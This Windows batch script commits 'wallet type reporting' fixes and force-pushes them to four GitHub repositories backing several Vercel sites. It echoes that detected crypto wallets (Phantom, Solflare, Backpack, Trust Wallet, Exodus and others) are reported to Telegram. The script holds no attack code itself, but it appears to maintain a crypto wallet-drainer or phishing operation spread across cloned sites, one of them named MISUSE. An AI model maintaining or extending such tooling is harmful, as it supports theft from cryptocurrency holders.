@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing wallet type reporting in Telegram...
echo.
echo Issues found:
echo - Wallet type not showing in Telegram messages
echo - Logic was hiding known wallet types
echo - Missing debug logging for troubleshooting
echo.
echo Fixes applied:
echo - Fixed wallet type display logic in logWalletDetected
echo - Added explicit list of known wallet types
echo - Added debug logging to track wallet type data
echo - Now shows wallet type for: Phantom, Solflare, Backpack, Glow, Trust Wallet, Exodus
echo.
echo Committing wallet type reporting fixes...
git add .
git commit -m "FIX: Wallet type reporting in Telegram - now shows wallet names correctly"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing wallet type fixes to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Wallet type reporting fixes pushed to all repositories.
echo.
echo Summary:
echo - Wallet type should now show in Telegram messages
echo - Debug logging added to track wallet type data
echo - Known wallet types: Phantom, Solflare, Backpack, Glow, Trust Wallet, Exodus
echo - Fixed logic that was hiding wallet types
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Test all wallet types:
echo 1. Phantom - should show "Type: Phantom"
echo 2. Solflare - should show "Type: Solflare"
echo 3. Backpack - should show "Type: Backpack"
echo 4. Glow - should show "Type: Glow"
echo 5. Trust Wallet - should show "Type: Trust Wallet"
echo 6. Exodus - should show "Type: Exodus"
echo.
echo Check Telegram for wallet type in messages!
pause
